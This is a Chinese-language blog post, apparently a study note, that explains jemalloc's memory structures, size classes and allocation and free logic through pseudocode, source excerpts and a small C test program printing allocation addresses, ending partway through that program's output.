<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">extent_node_s</span> <span class="title">extent_node_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tree of extents. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">extent_node_s</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> (defined(JEMALLOC_SWAP) || defined(JEMALLOC_DSS))</span></span><br><span class="line">	rb_node(<span class="keyword">extent_node_t</span>)	link_szad; <span class="comment">/* 大小/地址排序树的链接 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	rb_node(<span class="keyword">extent_node_t</span>)	link_ad; <span class="comment">/* 地址排序树的链接 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_PROF</span></span><br><span class="line">	<span class="keyword">prof_ctx_t</span>		*prof_ctx; <span class="comment">/* 配置文件计数器,用于huge的对象 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">void</span>			*addr; <span class="comment">/* 指向此树节点负责的范围的指针 */</span></span><br><span class="line">	<span class="keyword">size_t</span>			size; <span class="comment">/* 总区域大小 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>huge 的分配由 “extent_node_t” 结构表示，在所有线程共有的全局红黑树中排序</li>
<li>“extent_node_t” 结构分配在称为基节点的小内存区域中</li>
<li>基本节点不会影响最终用户堆分配的布局，因为它们由 DSS 或由 “mmap()” 获取的单个内存映射提供服务</li>
<li>用于分配空闲空间的实际方法取决于 jemalloc 是如何编译的，而 “mmap()” 是默认值</li>
</ul>
<p><strong>Regions/Allocations</strong></p>
<p>Jemalloc 实际分配给用户的内存空间就是 Regions，根据 Regions 的大小，可以把它区分为3个种类：</p>
<ul>
<li>Small/Medium</li>
<li>Large</li>
<li>Huge</li>
</ul>
<p>下图总结了到目前为止我们对 jemalloc 的分析：</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">   .----------------------------------.       .---------------------------.</span><br><span class="line"> .----------------------------------. |<span class="string">    +--+-----&gt; arena_chunk_t       </span>|</span><br><span class="line">.---------------------------------. |<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">                           </span>|</span><br><span class="line">|<span class="string">             arena_t             </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  .---------------------.  </span>|</span><br><span class="line">|<span class="string">                                 </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">                     </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string"> .--------------------.          </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">     arena_run_t     </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> arena_chunk_t list </span>|<span class="string">-----+    </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">                     </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string"> `--------------------&#x27;     </span>|<span class="string">    </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    .-----------.    </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string">                            </span>|<span class="string">    </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">   page    </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string">   arena_bin_t bins[];      </span>|<span class="string">    </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string"> .------------------------. </span>|<span class="string">    </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> bins[0]  ...  bins[27] </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string"> `------------------------&#x27; </span>|<span class="string">    </span>|<span class="string"> </span>|<span class="string">.&#x27;    </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string">     </span>|<span class="string">                      </span>|<span class="string">    </span>|<span class="string">.&#x27;      </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">`-----+----------------------+----&#x27;        |<span class="string">  </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">                      </span>|<span class="string">             </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">                      </span>|<span class="string">             </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">        . . .        </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">                      v             </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    .-----------.    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            .-------------------.   </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">   page    </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> .---------------. </span>|<span class="string">   </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> </span>|<span class="string"> arena_chunk_t </span>|<span class="string">-+---+  </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> `---------------&#x27; </span>|<span class="string">      </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">     [2-5]  </span>|<span class="string"> .---------------. </span>|<span class="string">      </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> </span>|<span class="string"> arena_chunk_t </span>|<span class="string"> </span>|<span class="string">      </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> `---------------&#x27; </span>|<span class="string">      </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string">       . . .       </span>|<span class="string">      </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> .---------------. </span>|<span class="string">      </span>|<span class="string">  </span>|<span class="string">                     </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> </span>|<span class="string"> arena_chunk_t </span>|<span class="string"> </span>|<span class="string">      </span>|<span class="string">  `---------------------&#x27;  </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string"> `---------------&#x27; </span>|<span class="string">      </span>|<span class="string">          [2-6]            </span>|</span><br><span class="line">      |<span class="string">            </span>|<span class="string">       . . .       </span>|<span class="string">      </span>|<span class="string">  .---------------------.  </span>|</span><br><span class="line">      |<span class="string">            `-------------------&#x27;      </span>|<span class="string">  </span>|<span class="string">                     </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">                                  +----+--+---&gt; arena_run_t     </span>|<span class="string">  </span>|</span><br><span class="line">      |<span class="string">                                  </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">                     </span>|<span class="string">  </span>|</span><br><span class="line">      +----------+                       |<span class="string">    </span>|<span class="string">  </span>|<span class="string">    .-----------.    </span>|<span class="string">  </span>|</span><br><span class="line">                 |<span class="string">                       </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">   page    </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">                 |<span class="string">                       </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">                 |<span class="string">                       </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">                 v                       |<span class="string">    </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">    .--------------------------.         |<span class="string">    </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">    |<span class="string">       arena_bin_t        </span>|<span class="string">         </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">    |<span class="string">     bins[0] (size 8)     </span>|<span class="string">         </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">    |<span class="string">                          </span>|<span class="string">         </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">    |<span class="string"> .----------------------. </span>|<span class="string">         </span>|<span class="string">    </span>|<span class="string">  </span>|<span class="string">        . . .        </span>|<span class="string">  </span>|</span><br><span class="line">    |<span class="string"> </span>|<span class="string"> arena_run_t *runcur; </span>|<span class="string">-+---------+    </span>|<span class="string">  </span>|<span class="string">    .-----------.    </span>|<span class="string">  </span>|</span><br><span class="line">    |<span class="string"> `----------------------&#x27; </span>|<span class="string">              </span>|<span class="string">  </span>|<span class="string">    </span>|<span class="string">   page    </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">    `--------------------------&#x27;              |<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">    </span>|<span class="string">  region   </span>|<span class="string">    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">    +-----------+    </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  </span>|<span class="string">                     </span>|<span class="string">  </span>|</span><br><span class="line">                                              |<span class="string">  `---------------------&#x27;  </span>|</span><br><span class="line">                                              `---------------------------&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="Jemalloc-分配机制"><a href="#Jemalloc-分配机制" class="headerlink" title="Jemalloc 分配机制"></a>Jemalloc 分配机制</h2><p>Jemalloc 把内存分配分为了 <strong>三个部分</strong>：</p>
<ul>
<li>第一部分类似 tcmalloc，是分别以8字节，16字节，64字节 …… 等分隔开的 <strong>small class</strong></li>
<li>第二部分以分页为单位，等差间隔开的 <strong>large class</strong></li>
<li>然后就是 <strong>huge class</strong></li>
</ul>
<p>内存块的管理也通过一种 chunk 进行，一个 chunk 的大小是 2^k (默认4 MB)，通过这种分配实现常数时间地分配 small 和 large 对象，对数时间地查询 huge 对象的 meta（使用红黑树） </p>
<p>默认64位系统的划分方式如下：</p>
<ul>
<li><strong>Small：</strong>[8]，[16,32,48,…,128]（16字节等分），[128,192,256,320, …,512]（64字节等分），[512,768,1024,1280,…,3840]（256字节等分）</li>
<li><strong>Large：</strong>[4 KB, 8 KB, 12 KB,…, 4072 KB]（4KB 等分，一页等分）</li>
<li><strong>Huge：</strong>[4 MB, 8 MB, 12 MB,…]（大于 4MB 的超大内存）</li>
</ul>
<p>接下来我们分析下 jemalloc 的整体内存分配和释放流程，主要分为 <strong>Samll</strong>、<strong>Large</strong> 和 <strong>Huge</strong> 三种场景：</p>
<ul>
<li><strong>Small 场景</strong><ul>
<li>如果请求分配内存的大小小于 arena 中的最小的 bin，那么优先从线程中对应的 tcache 中进行分配</li>
<li>首先确定查找对应的 tbin 中是否存在缓存的内存块，如果存在则分配成功，否则找到 tbin 对应的 arena</li>
<li>从 arena 中对应的 bin 中分配 region 保存在 tbin 的 avail 数组中，最终从 availl 数组中选取一个地址进行内存分配，当内存释放时也会将被回收的内存块进行缓存</li>
</ul>
</li>
<li><strong>Large 场景</strong><ul>
<li>Large 的内存分配与 Samll 类似，如果请求分配内存的大小大于 arena 中的最小的 bin，但是不大于 tcache 中能够缓存的最大块，依然会通过 tcache 进行分配，但是不同的是此时会分配 chunk 以及所对应的 run，从 chunk 中找到相应的内存空间进行分配</li>
<li>内存释放时也跟 samll 场景类似，会把释放的内存块缓存在 tacache 的 tbin 中</li>
<li>此外还有一种情况，当请求分配内存的大小大于 tcache 中能够缓存的最大块，但是不大于 chunk 的大小，那么将不会采用 tcache 机制，直接在 chunk 中进行内存分配</li>
</ul>
</li>
<li><strong>Huge 场景</strong><ul>
<li>如果请求分配内存的大小大于 chunk 的大小，那么直接通过 mmap 进行分配，调用 munmap 进行回收</li>
</ul>
</li>
</ul>
<p><strong>分配流程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MALLOC(size): <span class="comment">/* 如果size在huge的范围,则调用mmap进行分配 */</span></span><br><span class="line">    IF size CAN BE SERVICED BY AN ARENA: <span class="comment">/* 如果size在&#x27;arena&#x27;的范围内 */</span></span><br><span class="line">        IF size IS SMALL OR MEDIUM: <span class="comment">/* 如果size在&#x27;small/medium&#x27;的范围内 */</span></span><br><span class="line">            bin = get_bin_for_size(size)</span><br><span class="line"></span><br><span class="line">            IF bin-&gt;runcur EXISTS AND NOT FULL: <span class="comment">/* 如果对应的bin存在且未满 */</span></span><br><span class="line">                run = bin-&gt;runcur</span><br><span class="line">            ELSE:</span><br><span class="line">                run = lookup_or_allocate_nonfull_run() </span><br><span class="line">                bin-&gt;runcur = run</span><br><span class="line"></span><br><span class="line">            bit = get_first_set_bit(run-&gt;regs_mask)</span><br><span class="line">            region = get_region(run, bit)</span><br><span class="line"></span><br><span class="line">        ELIF size IS LARGE: <span class="comment">/* 如果size在&#x27;large&#x27;的范围内 */</span></span><br><span class="line">            region = allocate_new_run()</span><br><span class="line">    ELSE:</span><br><span class="line">        region = allocate_new_chunk()</span><br><span class="line">    RETURN region <span class="comment">/* 返回分配的区域 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果不在 arena 的范围内：<ul>
<li>则调用 allocate_new_chunk 分配一个新的 chunk，返回给用户</li>
</ul>
</li>
<li>如果在 arena 的范围内，并且在 small/medium 的范围内：<ul>
<li>调用 get_bin_for_size 获取对应大小的 bin</li>
<li>如果对应的 bin 存在且未满：<ul>
<li>直接从 bin 中摘下一个 run</li>
</ul>
</li>
<li>如果对应的 bin 不存在或者已满：<ul>
<li>调用 lookup_or_allocate_nonfull_run 申请一个 run，并接在 bin 的后面</li>
</ul>
</li>
<li>调用 get_first_set_bit 从 bin 中获取 bit（每个位对应一个区域，0 表示该区域已使用，1 位值表示相应区域空闲）</li>
<li>最后调用 get_region 从 bin 中获取一个 run</li>
</ul>
</li>
<li>否则调用 allocate_new_run 分配一个新的 run，返回给用户</li>
</ul>
<p><strong>释放流程</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">FREE(addr):</span><br><span class="line">    IF addr IS NOT EQUAL TO THE CHUNK IT BELONGS: <span class="comment">/* 如果addr不属于chunk */</span></span><br><span class="line">        IF addr IS A SMALL ALLOCATION: <span class="comment">/* 如果addr的大小范围为small */</span></span><br><span class="line">            run = get_run_addr_belongs_to(addr);</span><br><span class="line">            bin = run-&gt;bin;</span><br><span class="line">            size = bin-&gt;reg_size;</span><br><span class="line">            element = get_element_index(addr, run, bin)</span><br><span class="line">            unset_bit(run-&gt;regs_mask[element])</span><br><span class="line"></span><br><span class="line">        ELSE: <span class="comment">/* 如果addr的大小范围为large(以page为单位) */</span></span><br><span class="line">            run = get_run_addr_belongs_to(addr)</span><br><span class="line">            chunk = get_chunk_run_belongs_to(run)</span><br><span class="line">            run_index = get_run_index(run, chunk)</span><br><span class="line">            mark_pages_of_run_as_free(run_index)</span><br><span class="line"></span><br><span class="line">            IF ALL THE PAGES OF chunk ARE MARKED AS FREE: <span class="comment">/* 如果chunk的所有page都标记为空闲 */</span></span><br><span class="line">                unmap_the_chunk_s_pages(chunk)</span><br><span class="line"></span><br><span class="line">    ELSE: <span class="comment">/* 如果addr的大小范围为huge(通过mmap进行分配的) */</span></span><br><span class="line">        unmap_the_huge_allocation_s_pages(addr)</span><br></pre></td></tr></table></figure>
<ul>
<li>根据 addr 对应的 size 大小来选择释放的方法：<ul>
<li>huge：<ul>
<li>采用 unmap_the_huge_allocation_s_pages 进行释放</li>
</ul>
</li>
<li>small：<ul>
<li>调用 get_run_addr_belongs_to 获取该 addr 对应的 run</li>
<li>通过 run 获取对应的 bin</li>
<li>通过 bin 获取对应的 reg_size</li>
<li>调用 get_element_index 获取 region（大小为 byte）在 run 中的偏移</li>
<li>调用 unset_bit 进行释放</li>
</ul>
</li>
<li>large：<ul>
<li>调用 get_run_addr_belongs_to 获取该 addr 对应的 run</li>
<li>调用 get_chunk_run_belongs_to 获取该 addr 对应的 chunk</li>
<li>调用 get_run_index 获取 region（大小为 page）在 chunk 中的偏移</li>
<li>调用 mark_pages_of_run_as_free 进行释放</li>
<li>如果 chunk 的所有 page 都标记为 free（空闲）：<ul>
<li>调用 unmap_the_chunk_s_pages 释放该 chunk</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>分配 region</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* jemalloc-2.2.5/src/arena.c */</span></span><br><span class="line">ret = (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)run + (<span class="keyword">uintptr_t</span>)bin_info-&gt;reg0_offset +</span><br><span class="line">    (<span class="keyword">uintptr_t</span>)(bin_info-&gt;reg_size * regind));</span><br></pre></td></tr></table></figure>
<ul>
<li>region 的值可以理解为“3”部分相加：<ul>
<li>run：对应 run 的基地址</li>
<li>bin_info-&gt;reg0_offset：此 bin 对应的 run 中第一个 region 的偏移量</li>
<li>bin_info-&gt;reg_size * regind：目标 region 在 run 中的偏移量</li>
</ul>
</li>
<li>可以说，ptmalloc 就是通过偏移 regind 来获取 region 的位置的</li>
</ul>
<p>在 jemalloc-2.2.5 分配 region 前，会在目标 run 的范围的头部申请一个 arena_run_t 结构体来管理 run（但 jemalloc-5.0.1 是不会分配 arena_run_t 的）</p>
<ul>
<li>因为 run 以 page 为单位，所以 arena_run_t 的地址后3位为“0”</li>
<li>由此可以快速判断 arena_run_t 的位置</li>
</ul>
<p><strong>分配 run</strong></p>
<p>run 以 page 为单位，如果 size 比较小，run 的大小范围往往就是一页</p>
<ul>
<li>默认64位系统的划分方式：<ul>
<li><strong>Small：</strong>[8]，[16,32,48,…,128]（16字节等分），[128,192,256,320, …,512]（64字节等分），[512,768,1024,1280,…,3840]（256字节等分）</li>
</ul>
</li>
<li>通过以下案例，来看看不同 run 的地址范围：（jemalloc-5.0.1）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;jemalloc/jemalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *foo[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> *bar[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;foo &gt;&gt; %p\n&quot;</span>,foo);</span><br><span class="line"></span><br><span class="line">    foo[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:  size:%d \t%p\n&quot;</span>,<span class="number">0</span>,<span class="number">8</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">8</span>;i++)&#123;</span><br><span class="line">        foo[i] = <span class="built_in">malloc</span>(<span class="number">16</span>*i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; foo[%d]-foo[%d]=%d\n&quot;</span>,i,i<span class="number">-1</span>,(foo[i]-foo[i<span class="number">-1</span>])/<span class="number">4096</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:  size:%d\t%p\n&quot;</span>,i,<span class="number">16</span>*i,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">9</span>;i&lt;=<span class="number">14</span>;i++)&#123;</span><br><span class="line">        foo[i] = <span class="built_in">malloc</span>(<span class="number">128</span>+<span class="number">64</span>*(i<span class="number">-8</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; foo[%d]-foo[%d]=%d\n&quot;</span>,i,i<span class="number">-1</span>,(foo[i]-foo[i<span class="number">-1</span>])/<span class="number">4096</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:  size:%d\t%p\n&quot;</span>,i,<span class="number">128</span>+<span class="number">64</span>*(i<span class="number">-8</span>),(<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> ./jemalloc                                  </span><br><span class="line">foo &gt;&gt; <span class="number">0x7ffe3a4b1330</span></span><br><span class="line">foo[<span class="number">0</span>]:  size:<span class="number">8</span> 	<span class="number">0x91c2d008</span></span><br><span class="line">&gt;&gt; foo[<span class="number">1</span>]-foo[<span class="number">0</span>]=<span class="number">25</span></span><br><span class="line">foo[<span class="number">1</span>]:  size:<span class="number">16</span>	<span class="number">0x91c47000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">2</span>]-foo[<span class="number">1</span>]=<span class="number">-24</span> <span class="comment">// 反常</span></span><br><span class="line">foo[<span class="number">2</span>]:  size:<span class="number">32</span>	<span class="number">0x91c2e020</span></span><br><span class="line">&gt;&gt; foo[<span class="number">3</span>]-foo[<span class="number">2</span>]=<span class="number">25</span></span><br><span class="line">foo[<span class="number">3</span>]:  size:<span class="number">48</span>	<span class="number">0x91c48000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">4</span>]-foo[<span class="number">3</span>]=<span class="number">3</span></span><br><span class="line">foo[<span class="number">4</span>]:  size:<span class="number">64</span>	<span class="number">0x91c4b000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">5</span>]-foo[<span class="number">4</span>]=<span class="number">1</span></span><br><span class="line">foo[<span class="number">5</span>]:  size:<span class="number">80</span>	<span class="number">0x91c4c000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">6</span>]-foo[<span class="number">5</span>]=<span class="number">5</span></span><br><span class="line">foo[<span class="number">6</span>]:  size:<span class="number">96</span>	<span class="number">0x91c51000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">7</span>]-foo[<span class="number">6</span>]=<span class="number">3</span></span><br><span class="line">foo[<span class="number">7</span>]:  size:<span class="number">112</span>	<span class="number">0x91c54000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">8</span>]-foo[<span class="number">7</span>]=<span class="number">7</span></span><br><span class="line">foo[<span class="number">8</span>]:  size:<span class="number">128</span>	<span class="number">0x91c5b000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">9</span>]-foo[<span class="number">8</span>]=<span class="number">1</span></span><br><span class="line">foo[<span class="number">9</span>]:  size:<span class="number">192</span>	<span class="number">0x91c5c000</span></span><br><span class="line">&gt;&gt; foo[<span class="number">10</span>]-foo[<span class="number">9</span>]=<span class="number">3</span></span><br><span class="line">foo[<span class="number">10</span>]:  size:<span class="number">256</span>	<span class="number">0x91c5f000</span></span><br><span 